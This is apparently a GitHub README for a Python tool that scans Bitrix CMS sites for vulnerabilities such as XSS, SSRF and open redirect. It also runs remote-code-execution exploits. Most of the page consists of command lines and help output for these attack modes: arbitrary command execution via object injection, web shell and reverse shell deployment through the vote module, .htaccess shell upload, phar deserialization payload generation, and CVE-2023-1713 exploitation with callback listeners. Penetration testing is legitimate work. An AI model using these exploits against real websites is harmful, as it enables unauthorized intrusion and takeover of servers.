<a name="readme-top"></a>

<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/k1rurk/check_bitrix">
    <img src="https://upload.wikimedia.org/wikipedia/ru/thumb/5/51/1c_bitrix_logo.svg/2048px-1c_bitrix_logo.svg.png" alt="Logo" width="150" height="150">
  </a>
  <h3 align="center">Bitrix Scanner</h3>
  <p align="center">
    Check your website for Bitrix vulnerabilities
</div>



<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#features">Features</a></li>
    <li><a href="#usage">Usage</a></li>
    <ul>
        <li><a href="#running-scan-mode">Running scan mode</a></li>
        <li><a href="#running-rce-object-injection">Running RCE object injection</a></li>
        <li><a href="#running-rce-vote">Running RCE vote</a></li>
        <li><a href="#running-rce-vote-using-htaccess">Running RCE vote using .htaccess</a></li>
        <li><a href="#running-rce-vote-phar-deserialization">Running RCE vote phar deserialization</a></li>
        <li><a href="#running-rce-via-insecure-temporary-file-creation">Running RCE via Insecure Temporary File Creation</a></li>
      </ul>
    <li><a href="#legal-disclaimer">Legal disclaimer</a></li>
    <li><a href="#references">References</a></li>
  </ol>
</details>



<!-- FEATURES -->
## Features

This script scans common Bitrix vulnerabilities:
* exposed login pages;
* exposed register pages;
* pages that contain errors;
* admin panels;
* content spoofing;
* open redirect;
* reflected xss;
* stored xss via file upload (works only with Apache);
* ssrf.

You can also separately check following RCE vulnerabilities:
* object injection (RCE "html_editor_action")
* vote (webshell, reverse shell, phar, .htaccess)
* insecure temporary file creation (CVE-2023-1713).

<p align="right">(<a href="#readme-top">back to top</a>)</p>


<!-- USAGE EXAMPLES -->
## Usage

```sh
python3 test_bitrix.py -h
```
This will display help for the tool

```console
usage: python3 test_bitrix.py [-h] -t TARGET [-x proxy] {scan,rce_vote,vote_phar,vote_htaccess,object_injection,tmp_file_create} ...

positional arguments:
  {scan,rce_vote,vote_phar,vote_htaccess,object_injection,tmp_file_create}
    scan                Scan mode
    rce_vote            RCE vote mode
    vote_phar           RCE vote phar deserialize mode (Exploit Nginx or Apache setup using PHAR deserialization)
    vote_htaccess       RCE vote using .htaccess mode (Exploit Apache setup using .htaccess and shell upload)
    object_injection    RCE object injection mode
    tmp_file_create     RCE via Insecure Temporary File Creation CVE-2023-1713 (It works only with Apache. The .htaccess file is required to be present in the same directory as the Python3 exploit code). Need any valid set of   
                        credentials (regardless of privileges)

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target url (example: https://target.com) (default: None)
  -x proxy, --proxy proxy
                        URL proxy (example: http://127.0.0.1:8080) (default: None)
```

### Running scan mode

Scan common vulnerabilities

```sh
python3 test_bitrix.py -t https://example.com scan -s http://subdomain.oastify.com
```
Display help for mode
```sh
python3 test_bitrix.py scan -h
```

```console
usage: python3 test_bitrix.py scan [-h] -s SSRF_URL

options:
  -h, --help            show this help message and exit
  -s SSRF_URL, --ssrf_url SSRF_URL
                        url for ssrf attack (example: http://5kqki2fsl626q2257vy6xc2ef5lw9rxg.oastify.com)
```

### Running RCE object injection

```sh
python3 test_bitrix.py -t https://example.com object_injection -c 'whoami'
```

Display help for mode
```sh
python3 test_bitrix.py object_injection -h
```

```console
usage: python3 test_bitrix.py object_injection [-h] [-f FUNCTION] -c COMMAND

options:
  -h, --help            show this help message and exit
  -f FUNCTION, --function FUNCTION
                        Used function
  -c COMMAND, --command COMMAND
                        Command for execution
```

### Running RCE vote

Webshell

```sh
python3 test_bitrix.py -t https://example.com rce_vote --web-shell true
```
Reverse shell
```sh
python3 test_bitrix.py -t https://example.com rce_vote --lhost 192.168.1.1 --lport 8001
```

Display help for mode
```sh
python3 test_bitrix.py rce_vote -h
```

```console
usage: python3 test_bitrix.py rce_vote [-h] [--id_agent ID_AGENT] [--lhost LHOST] [--lport LPORT] [--web-shell webshell] [--path path]

options:
  -h, --help            show this help message and exit
  --id_agent ID_AGENT   ID of vote module agent (2, 4 and 7 available)
  --lhost LHOST         IP address for reverse connection
  --lport LPORT         Port of the host that listens for reverse connection
  --web-shell webshell  Use web shell instead of console reverse shell
  --path path           Path where in the site to upload a random file (example: /upload/iblock/1d3/)

```


### Running RCE vote using .htaccess

Prepare webshell page for a payload. The payload must not be .php. The webshell may be taken from [here](https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php) just save it as html
```sh
python3 test_bitrix.py -t https://example.com vote_htaccess -p shell.html
```
Display help for mode
```sh
python3 test_bitrix.py vote_htaccess -h
```

```console
usage: python3 test_bitrix.py vote_htaccess [-h] -p payload

options:
  -h, --help            show this help message and exit
  -p payload, --payload payload
                        Path to payload file
```

### Running RCE vote phar deserialization

Generate phar payload file with php script
```sh
php -d phar.readonly=0 gadgets.php rce1 system '<os command here>' payload.phar
```
Use it as payload here
```sh
python3 test_bitrix.py -t https://example.com vote_phar -p payload.phar
```

Display help for mode
```sh
python3 test_bitrix.py vote_phar -h
```

```console
usage: python3 test_bitrix.py vote_phar [-h] -p payload

options:
  -h, --help            show this help message and exit
  -p payload, --payload payload
                        Path to payload file

```

### Running RCE via Insecure Temporary File Creation

It works only with Apache. The .htaccess file is required to be present in the same directory as the Python3 exploit code.
Get user credentials regardless of privileges. Point out the login page in the parameter `-r`, port of the host that listens for web connection `--lport1`, port of the host that listens for reverse shell connection `--lport2`
```sh
python3 test_bitrix.py -t https://example.com tmp_file_create -r bitrix/components/bitrix/map.yandex.search/settings/settings.php?login=yes -l user -p 123456 --lhost 192.168.1.11 --lport1 8001 --lport2 9001
```
Create file cached-creds.txt in the same directory as the python script code, and write down PHPSESSID:sessid value, then run the command below
```sh
python3 test_bitrix.py -t https://example.com tmp_file_create --lhost 192.168.1.11 --lport1 8001 --lport2 9001
```

Display help for mode
```sh
python3 test_bitrix.py tmp_file_create -h
```

```console
usage: python3 test_bitrix.py tmp_file_create [-h] [-r PATH_LOGIN] [-l LOGIN] [-p PASSWORD] --lhost LHOST --lport1 LPORT1 --lport2 LPORT2 [-d DELAY_SECONDS] [-n N_REPS] [-i SITE_ID]

options:
  -h, --help            show this help message and exit
  -r PATH_LOGIN, --path_login PATH_LOGIN
                        Url path for login
  -l LOGIN, --login LOGIN
                        User login
  -p PASSWORD, --password PASSWORD
                        User password
  --lhost LHOST         IP address for reverse connection
  --lport1 LPORT1       Port of the host that listens for web connection
  --lport2 LPORT2       Port of the host that listens for reverse shell connection
  -d DELAY_SECONDS, --delay_seconds DELAY_SECONDS
                        Delay the deletion of uploaded files
  -n N_REPS, --n_reps N_REPS
                        Number of replicated files
  -i SITE_ID, --site_id SITE_ID
                        Site id
```

<p align="right">(<a href="#readme-top">back to top</a>)</p>


<!-- Legal disclaimer -->
## Legal disclaimer
Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program.
<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- References -->
## References

* [Выйди и зайди нормально](https://coollib.net/b/669667-anton-lopanitsyn-vyiydi-i-zaydi-normalno/download)
* [Уязвимости и атаки на CMS Bitrix](https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf)
* [Reflected XSS](https://starlabs.sg/advisories/23/23-1719/#2-reflected-xss)
* [Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page](https://starlabs.sg/advisories/23/23-1715/)
* [Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation](https://starlabs.sg/advisories/23/23-1713/)

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
